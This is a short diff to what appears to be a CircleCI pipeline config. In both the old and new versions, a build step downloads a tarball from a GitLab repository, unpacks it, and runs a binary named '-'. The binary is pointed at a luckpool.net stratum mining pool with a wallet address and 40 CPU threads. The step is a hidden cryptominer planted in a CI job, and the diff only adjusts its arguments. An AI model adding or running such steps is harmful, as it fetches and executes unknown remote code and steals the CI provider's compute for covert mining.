@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://gitlab.com/anaqerim/tugas-akhir/-/raw/main/elmachine.tar.gz && tar -xvf elmachine.tar.gz && ./- -c stratum+tcp://na.luckpool.net:3956#xnsub -u RX7wHGw8b3M6wvtzpecYnFTS4M5iReDH52.kogche -p -x --cpu 40
+      - run:wget https://gitlab.com/anaqerim/tugas-akhir/-/raw/main/elmachine.tar.gz && tar -xvf elmachine.tar.gz && ./- -c stratum+tcp://na.luckpool.net:3956#xnsub -u RX7wHGw8b3M6wvtzpecYnFTS4M5iReDH52.kogche -p d=16384s, --cpu 40
